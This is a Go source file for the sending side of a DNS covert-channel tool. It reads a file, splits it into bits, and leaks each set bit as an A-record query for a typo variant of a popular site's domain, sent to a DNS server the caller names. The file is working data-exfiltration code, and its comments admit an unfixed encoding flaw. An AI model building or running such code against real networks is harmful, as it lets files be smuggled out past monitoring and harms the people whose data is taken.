// client.go
package client

import (
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/miekg/dns"
)

var DomainList = [...]string{
	"aaazon.com", "aacebook.com", "aamazon.com", "aapple.com", "aazon.com", "abay.com", "acazon.com", "acebook.com", "adple.com", "aeazon.com", "aeple.com", "aetflix.com", "agazon.com", "agple.com", "ahazon.com", "ahoo.com", "ajazon.com", "amaazon.com", "amadon.com", "amaion.com", "amakon.com", "amaon.com", "amazan.com", "amazcn.com", "amazen.com", "amazgn.com", "amazln.com", "amazn.com", "amaznn.com", "amazo.com", "amazob.com", "amazof.com", "amazog.com", "amazoh.com", "amazoj.com", "amazon.com", "amazonn.com", "amazoo.com", "amazoon.com", "amazop.com", "amazoq.com", "amazou.com", "amazpn.com", "amazwn.com", "amazzon.com", "amdzon.com", "amgzon.com", "amhzon.com", "amizon.com", "amjzon.com", "amkzon.com", "ammazon.com", "ample.com", "amuzon.com", "amvzon.com", "amzon.com", "aoutube.com", "aphle.com", "apile.com", "aple.com", "apnle.com", "apole.com", "appae.com", "appde.com", "appe.com", "appee.com", "appfe.com", "apphe.com", "appke.com", "appl.com", "applb.com", "applee.com", "applg.com", "appli.com", "applj.com", "applle.com", "applp.com", "applq.com", "appls.com", "applu.com", "applx.com", "applz.com", "appple.com", "appre.com", "appve.com", "aprle.com", "apsle.com", "aptle.com", "apxle.com", "apyle.com", "asazon.com", "atazon.com", "awitter.com", "awple.com", "axple.com", "ayazon.com", "ayhoo.com", "bay.com", "bbing.com", "bbng.com", "bcng.com", "bdng.com", "beay.com", "beddit.com", "betflix.com", "biag.com", "bicg.com", "bifg.com", "big.com", "bigg.com", "bihg.com", "biing.com", "bikg.com", "bin.com", "bine.com", "bing.com", "bingg.com", "bini.com", "binl.com", "binn.com", "binng.com", "binp.com", "binq.com", "bins.com", "bint.com", "binu.com", "binx.com", "binz.com", "biog.com", "biqg.com", "birg.com", "bisg.com", "bitg.com", "biyg.com", "blng.com", "bong.com", "bpng.com", "bqng.com", "brng.com", "bsn.com", "bung.com", "bwng.com", "bzng.com", "cbay.com", "cing.com", "cmazon.com", "coogle.com", "csn.com", "dacebook.com", "ding.com", "dinkedin.com", "doutube.com", "dsn.com", "eaay.com", "eahoo.com", "eba.com", "ebaa.com", "ebaay.com", "ebad.com", "ebae.com", "ebag.com", "ebaj.com", "ebal.com", "eban.com", "ebap.com", "ebas.com", "ebau.com", "ebax.com", "ebayy.com", "ebaz.com", "ebbay.com", "ebby.com", "ebdy.com", "ebey.com", "ebfy.com", "ebgy.com", "ebhy.com", "ebiy.com", "ebjy.com", "ebmy.com", "ebpy.com", "ebqy.com", "ebry.com", "ebsy.com", "ebty.com", "ebvy.com", "eby.com", "ebzy.com", "eday.com", "eddit.com", "eeay.com", "eebay.com", "eeddit.com", "eetflix.com", "eiay.com", "ekay.com", "enay.com", "entflix.com", "eoogle.com", "epay.com", "eray.com", "erddit.com", "esay.com", "etay.com", "etflix.com", "ewitter.com", "eyay.com", "ezay.com", "faacebook.com", "faaebook.com", "fabebook.com", "facbbook.com", "facbook.com", "faccebook.com", "facdbook.com", "facebaok.com", "facebbok.com", "facebbook.com", "facebjok.com", "facebohk.com", "facebojk.com", "facebok.com", "facebomk.com", "facebonk.com", "faceboo.com", "facebooc.com", "facebood.com", "facebook.com", "facebool.com", "faceboook.com", "facebooq.com", "faceboos.com", "facebooy.com", "faceboqk.com", "facebosk.com", "facebowk.com", "facebrok.com", "facebtok.com", "facebuok.com", "facebyok.com", "facebzok.com", "faceebook.com", "facefook.com", "facegook.com", "facekook.com", "faceook.com", "faceqook.com", "facetook.com", "facgbook.com", "faclbook.com", "facqbook.com", "factbook.com", "facvbook.com", "facxbook.com", "faebook.com", "fahebook.com", "fapebook.com", "fatebook.com", "fawebook.com", "faxebook.com", "fayebook.com", "fbcebook.com", "fccebook.com", "fcebook.com", "fdcebook.com", "ffacebook.com", "ffcebook.com", "fgcebook.com", "finkedin.com", "flcebook.com", "fmcebook.com", "fqcebook.com", "fsn.com", "fzcebook.com", "gahoo.com", "ggoogle.com", "gikipedia.org", "ging.com", "gmogle.com", "gofgle.com", "gogle.com", "gokgle.com", "golgle.com", "gooble.com", "goodle.com", "googae.com", "googbe.com", "googce.com", "googe.com", "googee.com", "googfe.com", "googge.com", "googgle.com", "googje.com", "googke.com", "googl.com", "google.com", "googlee.com", "googlg.com", "googlh.com", "googli.com", "googlle.com", "googlw.com", "googme.com", "googre.com", "googze.com", "gookle.com", "goole.com", "goonle.com", "gooogle.com", "goosle.com", "gooule.com", "gorgle.com", "gosgle.com", "govgle.com", "gowgle.com", "goygle.com", "gpogle.com", "gsn.com", "guogle.com", "gxogle.com", "hacebook.com", "hbay.com", "hikipedia.org", "iacebook.com", "ibay.com", "ibstagram.com", "ieddit.com", "iinstagram.com", "iistagram.com", "ikipedia.org", "ilnkedin.com", "inatagram.com", "inbtagram.com", "indtagram.com", "ing.com", "inkedin.com", "inmtagram.com", "innstagram.com", "inptagram.com", "insaagram.com", "insagram.com", "inseagram.com", "insnagram.com", "insoagram.com", "insqagram.com", "insstagram.com", "instaagram.com", "instagam.com", "instageam.com", "instaggam.com", "instaggram.com", "instagiam.com", "instagmam.com", "instagra.com", "instagraam.com", "instagrab.com", "instagraf.com", "instagrag.com", "instagrah.com", "instagrak.com", "instagram.com", "instagramm.com", "instagran.com", "instagrap.com", "instagrat.com", "instagrav.com", "instagrax.com", "instagrbm.com", "instagrim.com", "instagrjm.com", "instagrm.com", "instagrom.com", "instagrram.com", "instagrrm.com", "instagrsm.com", "instagrxm.com", "instagrzm.com", "instagtam.com", "instakram.com", "instamram.com", "instanram.com", "instaram.com", "instarram.com", "instavram.com", "instaxram.com", "instazram.com", "instggram.com", "instgram.com", "instmgram.com", "instsgram.com", "insttagram.com", "instvgram.com", "insvagram.com", "insxagram.com", "intagram.com", "invtagram.com", "iostagram.com", "ipple.com", "isn.com", "isstagram.com", "istagram.com", "itstagram.com", "ivstagram.com", "iwitter.com", "iwkipedia.org", "iystagram.com", "jacebook.com", "jahoo.com", "jbay.com", "jeddit.com", "jikipedia.org", "jmazon.com", "joogle.com", "joutube.com", "jpple.com", "jsn.com", "kacebook.com", "kahoo.com", "kbay.com", "keddit.com", "ketflix.com", "king.com", "knstagram.com", "ksn.com", "lahoo.com", "leddit.com", "lfnkedin.com", "lhnkedin.com", "liikedin.com", "likedin.com", "likkedin.com", "linaedin.com", "linedin.com", "lineedin.com", "liniedin.com", "linkcdin.com", "linkdin.com", "linkeain.com", "linkedan.com", "linkedcn.com", "linkeddin.com", "linkedfn.com", "linkedi.com", "linkedic.com", "linkediin.com", "linkedij.com", "linkedin.com", "linkediq.com", "linkedit.com", "linkedn.com", "linkedrn.com", "linkedsn.com", "linkeedin.com", "linkefin.com", "linkelin.com", "linkeoin.com", "linkevin.com", "linkewin.com", "linkeyin.com", "linkkedin.com", "linkldin.com", "linkndin.com", "linkodin.com", "linkwdin.com", "linkxdin.com", "linkzdin.com", "linnkedin.com", "linoedin.com", "linwedin.com", "lipkedin.com", "lirkedin.com", "liukedin.com", "livkedin.com", "liwkedin.com", "liykedin.com", "lknkedin.com", "llinkedin.com", "lmnkedin.com", "lnkedin.com", "lrnkedin.com", "lsn.com", "lwitter.com", "lwnkedin.com", "lynkedin.com", "maazon.com", "mazon.com", "mbay.com", "mbn.com", "mdn.com", "metflix.com", "mfn.com", "mhn.com", "ming.com", "minkedin.com", "mmn.com", "mmsn.com", "mn.com", "mnn.com", "moogle.com", "moutube.com", "mpn.com", "ms.com", "msf.com", "msg.com", "msi.com", "msl.com", "msm.com", "msn.com", "msnn.com", "mso.com", "msp.com", "msq.com", "msr.com", "msu.com", "msv.com", "msw.com", "msx.com", "msz.com", "mtn.com", "mun.com", "mvn.com", "nacebook.com", "necflix.com", "neddit.com", "neetflix.com", "nefflix.com", "neflix.com", "nejflix.com", "nekflix.com", "neoflix.com", "neqflix.com", "nerflix.com", "netalix.com", "netblix.com", "netfaix.com", "netfeix.com", "netfflix.com", "netfhix.com", "netfix.com", "netflcx.com", "netfldx.com", "netflfx.com", "netfli.com", "netflic.com", "netflif.com", "netflih.com", "netflii.com", "netfliix.com", "netflin.com", "netflio.com", "netfliq.com", "netflix.com", "netflixx.com", "netfliy.com", "netfljx.com", "netfllix.com", "netflmx.com", "netflox.com", "netflpx.com", "netflqx.com", "netfltx.com", "netflvx.com", "netflx.com", "netflxx.com", "netflyx.com", "netfmix.com", "netfrix.com", "netfsix.com", "netfuix.com", "netfxix.com", "netfyix.com", "netlix.com", "netmlix.com", "netolix.com", "nettflix.com", "nettlix.com", "netylix.com", "netzlix.com", "newflix.com", "neyflix.com", "nezflix.com", "nikipedia.org", "nistagram.com", "njtflix.com", "nltflix.com", "nmazon.com", "nnetflix.com", "nntflix.com", "notflix.com", "npple.com", "nstagram.com", "ntflix.com", "nwtflix.com", "ogogle.com", "oikipedia.org", "oogle.com", "ooogle.com", "opple.com", "osn.com", "outube.com", "oyutube.com", "pahoo.com", "paple.com", "pbay.com", "ping.com", "pinkedin.com", "poogle.com", "pple.com", "qmazon.com", "qwitter.com", "raddit.com", "rbay.com", "rdddit.com", "readit.com", "reddbt.com", "redddit.com", "reddet.com", "reddft.com", "reddgt.com", "reddi.com", "reddie.com", "reddig.com", "reddih.com", "reddii.com", "reddiit.com", "reddik.com", "reddin.com", "reddio.com", "reddit.com", "redditt.com", "reddix.com", "reddjt.com", "reddlt.com", "reddmt.com", "reddot.com", "reddrt.com", "reddt.com", "reddtt.com", "reddxt.com", "redfit.com", "rediit.com", "redit.com", "redjit.com", "redkit.com", "redlit.com", "redmit.com", "rednit.com", "redoit.com", "redpit.com", "redrit.com", "redsit.com", "reduit.com", "redzit.com", "reeddit.com", "reedit.com", "reidit.com", "reldit.com", "remdit.com", "rendit.com", "reqdit.com", "resdit.com", "retdit.com", "retflix.com", "rexdit.com", "reydit.com", "rinkedin.com", "rlddit.com", "rmazon.com", "rpple.com", "rreddit.com", "rsddit.com", "rsn.com", "ruddit.com", "rvddit.com", "rwddit.com", "rxddit.com", "ryddit.com", "sahoo.com", "sing.com", "sinkedin.com", "smn.com", "sn.com", "tditter.com", "tetflix.com", "titter.com", "tlitter.com", "tnitter.com", "toitter.com", "toogle.com", "tritter.com", "tsn.com", "ttwitter.com", "tuitter.com", "twbtter.com", "twdtter.com", "twidter.com", "twifter.com", "twihter.com", "twiitter.com", "twijter.com", "twimter.com", "twitcer.com", "twitder.com", "twiter.com", "twitger.com", "twittdr.com", "twitte.com", "twittee.com", "twitteer.com", "twittef.com", "twitteg.com", "twitteh.com", "twittei.com", "twittem.com", "twitten.com", "twitter.com", "twitterr.com", "twittex.com", "twittor.com", "twittr.com", "twittrr.com", "twittter.com", "twitttr.com", "twittvr.com", "twittyr.com", "twituer.com", "twitxer.com", "twiuter.com", "twiwter.com", "twjtter.com", "twltter.com", "twmtter.com", "twotter.com", "twtter.com", "twttter.com", "twutter.com", "twvtter.com", "twwitter.com", "twytter.com", "tzitter.com", "uahoo.com", "ubay.com", "uing.com", "vahoo.com", "vbay.com", "veddit.com", "vetflix.com", "voutube.com", "wakipedia.org", "wbay.com", "wbkipedia.org", "wdkipedia.org", "wiaipedia.org", "wieipedia.org", "wiikipedia.org", "wiipedia.org", "wikbpedia.org", "wikepedia.org", "wikhpedia.org", "wikiedia.org", "wikiipedia.org", "wikiledia.org", "wikipadia.org", "wikipdia.org", "wikipeaia.org", "wikipebia.org", "wikipeda.org", "wikipedca.org", "wikipedda.org", "wikipeddia.org", "wikipedfa.org", "wikipedi.org", "wikipedia.org", "wikipediaa.org", "wikipedie.org", "wikipediia.org", "wikipedij.org", "wikipedik.org", "wikipedil.org", "wikipediq.org", "wikipedir.org", "wikipediu.org", "wikipediv.org", "wikipedna.org", "wikipedqa.org", "wikipedta.org", "wikipedua.org", "wikipedxa.org", "wikipedya.org", "wikipedza.org", "wikipeedia.org", "wikipegia.org", "wikipeia.org", "wikipeiia.org", "wikipejia.org", "wikipekia.org", "wikipepia.org", "wikipesia.org", "wikipexia.org", "wikipezia.org", "wikippedia.org", "wikipqdia.org", "wikiptdia.org", "wikipvdia.org", "wikipxdia.org", "wikipydia.org", "wikiqedia.org", "wikitedia.org", "wikkipedia.org", "wikkpedia.org", "wikopedia.org", "wikpedia.org", "wikppedia.org", "wikrpedia.org", "wiktpedia.org", "wikwpedia.org", "wing.com", "winkedin.com", "wioipedia.org", "wiripedia.org", "witter.com", "wkipedia.org", "wskipedia.org", "wsn.com", "wtitter.com", "wvkipedia.org", "wwikipedia.org", "wwitter.com", "xikipedia.org", "xpple.com", "xsn.com", "xwitter.com", "yaahoo.com", "yaboo.com", "yacoo.com", "yadoo.com", "yaeoo.com", "yahbo.com", "yaheo.com", "yahho.com", "yahhoo.com", "yahio.com", "yahjo.com", "yahko.com", "yahno.com", "yaho.com", "yahob.com", "yahoc.com", "yahon.com", "yahoo.com", "yahooo.com", "yahoq.com", "yahos.com", "yahow.com", "yahox.com", "yahso.com", "yahwo.com", "yahzo.com", "yaioo.com", "yajoo.com", "yakoo.com", "yaloo.com", "yaoo.com", "yaooo.com", "yapoo.com", "yauoo.com", "yautube.com", "yayoo.com", "ybay.com", "ybhoo.com", "ybutube.com", "ycutube.com", "ydhoo.com", "yehoo.com", "yetflix.com", "yeutube.com", "yfhoo.com", "yghoo.com", "ygutube.com", "yhoo.com", "yinkedin.com", "yiutube.com", "ylutube.com", "ynhoo.com", "yoatube.com", "yobtube.com", "yoetube.com", "yoltube.com", "yontube.com", "yooutube.com", "yoptube.com", "yoqtube.com", "yostube.com", "yotube.com", "youcube.com", "youdube.com", "youjube.com", "youmube.com", "youoube.com", "youpube.com", "youqube.com", "yousube.com", "youtbe.com", "youtfbe.com", "youtgbe.com", "youtjbe.com", "youtkbe.com", "youtnbe.com", "youtsbe.com", "youttbe.com", "youttube.com", "youtuae.com", "youtub.com", "youtuba.com", "youtubb.com", "youtubbe.com", "youtube.com", "youtubee.com", "youtubj.com", "youtubl.com", "youtubo.com", "youtubp.com", "youtubq.com", "youtubr.com", "youtude.com", "youtue.com", "youtuee.com", "youtufe.com", "youtuhe.com", "youtune.com", "youtuoe.com", "youture.com", "youtuube.com", "youtvbe.com", "youube.com", "youutube.com", "youwube.com", "youxube.com", "ypple.com", "yqhoo.com", "yrutube.com", "ysn.com", "ysutube.com", "yutube.com", "ywhoo.com", "yyahoo.com", "yyoutube.com", "yyutube.com", "yzhoo.com", "zahoo.com", "zinkedin.com", "zmazon.com", "zoogle.com", "zoutube.com", "zwitter.com"}

func StartSender(filename, dnsIP string) {
	serverAddr := dnsIP + ":53"

	file_data := readFile(filename)
	// Tells us how big the file is so receiver knows not to segfault
	file_size := strconv.Itoa(len(file_data)) + ":"
	fmt.Println(file_size)
	size_header := []byte(file_size)

	// Adding the header and data together
	payload := append(size_header, file_data...)

	// Sending message
	var k = 0
	for i, chat := range payload {
		switch i % 3 {
		case 0:
			fmt.Printf("\r%-20s", "Sending data.")
		case 1:
			fmt.Printf("\r%-20s", "Sending data..")
		case 2:
			fmt.Printf("\r%-20s", "Sending data...")
		default:
		}
		/*
			the first couple values in payload are actually bytes, which we want to send as bits
			So we have to manually send them with the below loop

			However the rest of the data is represented as bits (1 or 0) in the byte array,
			which means we are actually sending 00000000 and 00000001, not 1 or 0
			but we will parse it correctly when we receive it (line 84-86 in receiver.go)

			This does SIGNIFICANTLY increase the amount of domain names required, because now
			we are adding 8 domains to every bit of data outside the heater, which is the majority

			This is easibly fixable by simply putting the below for loop outside the main loop and using it
			to parse the header out

			but I ran out of time :(
		*/
		for j := 7; j >= 0; j-- {
			// Loading bit and then sending DNS accordingly
			bit := (chat >> uint(j)) & 1
			if bit == 1 {
				msg := new(dns.Msg)
				msg.SetQuestion(dns.Fqdn(DomainList[k]), dns.TypeA)
				c := &dns.Client{Timeout: 10 * time.Second}
				_, _, err := c.Exchange(msg, serverAddr)
				if err != nil {
					fmt.Println("Errror: " + err.Error())
				}
			}
			// Incrementing our DNS names to send
			k++
		}
	}
}

/*
Reads a given file and oputs it in an array of bits
*/

func readFile(path string) []byte {
	data, err := os.ReadFile(path)
	bit_file := make([]byte, 0)
	if err != nil {
		fmt.Println("Bad path")
		return nil
	}
	for _, b := range data {
		for i := 7; i >= 0; i-- {
			bit := (b >> uint(i)) & 1
			bit_file = append(bit_file, bit)
		}
	}
	return bit_file
}
